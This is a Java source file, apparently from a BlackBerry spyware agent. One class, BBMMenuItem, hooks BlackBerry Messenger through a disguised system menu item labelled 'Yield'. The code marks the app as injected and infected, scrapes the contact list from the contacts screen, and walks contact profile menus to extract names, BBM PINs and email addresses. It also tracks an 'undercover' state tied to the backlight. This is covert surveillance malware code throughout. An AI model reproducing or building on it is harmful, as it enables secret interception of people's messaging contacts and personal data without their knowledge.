package blackberry.agent.im;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.FieldExplorer;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class BBMMenuItem extends ApplicationMenuItem {
	private static String bbmMenu = "Yield";
	//#ifdef DEBUG
	private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
	// #endif

	UiApplication bbmApplication;
	Screen contactsScreen;
	// Vector conversationScreens = new Vector();

	Hashtable users = new Hashtable();
	Hashtable userConversations = new Hashtable();

	public boolean bbmInjected = false;

	// int numContacts;
	// int numEmails;

	private static BBMMenuItem instance;
    private static final long GUID = 0x25fbb0c55be3907fL;

    public static synchronized BBMMenuItem getInstance() {
        if (instance == null) {
            instance = (BBMMenuItem) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final BBMMenuItem singleton = new BBMMenuItem(20);

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }


	public BBMMenuItem(int arg0) {
		super(arg0);

		undercover = !Backlight.isEnabled();
		conversationScreen = new ConversationScreen();
		//lookForConversationsThread();

	}
	
	public void checkForConversationScreen(){
	    //#ifdef DEBUG
        debug.trace("checkForConversationScreen");
        //#endif
	    conversationScreen.getConversationScreen();
	}

	Vector contacts = new Vector();
	Thread t = null;
	boolean undercover = false;
	ConversationScreen conversationScreen;

	public void lookForConversationsThread() {

	    //#ifdef DEBUG
        debug.trace("lookForConversationsThread");
        //#endif
        
		if (t != null) {
			return;
		}
		conversationScreen = new ConversationScreen();
		t = new Thread(conversationScreen);

		t.start();

	}

	public synchronized Object run(Object context) {
		try {
		    
		    if(bbmInjected){
		        //#ifdef DEBUG
                debug.trace("run: already injected");
                //#endif
                return null;
		    }
		    
		    debug.init();
			debug.info("BBMMenuItem context: " + context);
			UiApplication app = UiApplication.getUiApplication();
			Class cl = app.getClass();

			debug.trace("class: " + cl);

			Screen screen = UiApplication.getUiApplication().getActiveScreen();

			debug.trace("screen: " + screen + " count: "
					+ screen.getUiEngine().getScreenCount());

			//debug.startBuffering(EventLogger.INFORMATION);
			//#ifdef DEBUG
            debug.trace("run: "+screen.getClass().getName());
            //#endif
			if (screen.getClass().getName().indexOf("ContactsScreen") > 0) {
				contacts.removeAllElements();

				contactsScreen = screen;
				bbmApplication = UiApplication.getUiApplication();

				FieldExplorer explorer = new FieldExplorer();
				contacts = explorer.explore(screen);

				screen.close();
				bbmInjected = true;

				// lookForConversationsThread();
				conversationScreen.setBBM(bbmApplication);

				debug.info("BBM INJECTED!");
				debug.ledStart(Debug.COLOR_GREEN);
				
				AppInjectorBBM.getInstance().setInfected();

			} else {
				debug.warn("BBM NOT INJECTED!");
				debug.ledStart(Debug.COLOR_RED);
			}

			//debug.stopBuffering();

		} catch (Exception ex) {
			debug.warn("injectBBM:" + ex.toString());
			debug.ledStart(Debug.COLOR_RED);
		}
		
		return null;
	}

	private synchronized boolean extractProfile(Screen screen) {
		debug.trace("extractProfile");
		debug.trace("  local active screen: "
				+ UiApplication.getUiApplication().getActiveScreen());

		try {
			if (MenuWalker.walk("View Contact Profile", screen, true)
					|| MenuWalker.walk("Contact Profile", screen, true)) {
				Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);

				debug.info("walked in Contact Profile");
				Utils.sleep(100);
				Screen newScreen = UiApplication.getUiApplication()
						.getActiveScreen();

				if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
					debug.trace("no Contact Profile: " + newScreen);
					return false;
				}
				// Ocio che gli schermi aperti vengono agganciati a
				// UiApplication!
				// debug.trace("  active screen: " + newScreen);
				// debug.trace("  local active screen: "
				// + UiApplication.getUiApplication().getActiveScreen());

				debug.trace("exploring Contact Profile: " + newScreen);

				FieldExplorer explorer = new FieldExplorer();
				Vector textfields = explorer.explore(newScreen);

				if (textfields.size() == 2 || textfields.size() == 3) {
					String user = (String) textfields.elementAt(0);
					String pin = (String) textfields.elementAt(1);
					String email = "";
					
					debug.info("User: " + user);
					debug.info("PIN: " + pin);
					
					if(textfields.size() == 3){
						email = (String) textfields.elementAt(2);
						debug.info("Email: " + email);
					}
					
					users.put(user.toLowerCase(), new User(user,pin,email));

					debug.ledStart(Debug.COLOR_ORANGE);
				}

				debug.trace("closing Contact Profile");
				newScreen.close();
			} else {
				debug.info("");
			}

		} catch (Exception ex) {
			//debug.stopBuffering();
			debug.error(ex.toString());
			return false;
		}
		return true;
	}

	public String toString() {
		return bbmMenu;
	}

	public void addMenuBBM(String menuName) {
	    //#ifdef DEBUG
        debug.trace("addMenuBBM");
        //#endif
        
        bbmMenu = menuName;
        
		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
		// long bbmid = 4470559380030396000L; Non funziona
		// long bbmid = 5028374280894129973L; Non funziona
		// long bbmid = 7084794250801777300L;
		ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
	}

	public void removeMenuBBM() {
	    //#ifdef DEBUG
        debug.trace("removeMenuBBM");
        //#endif
		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
		ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
	}

}
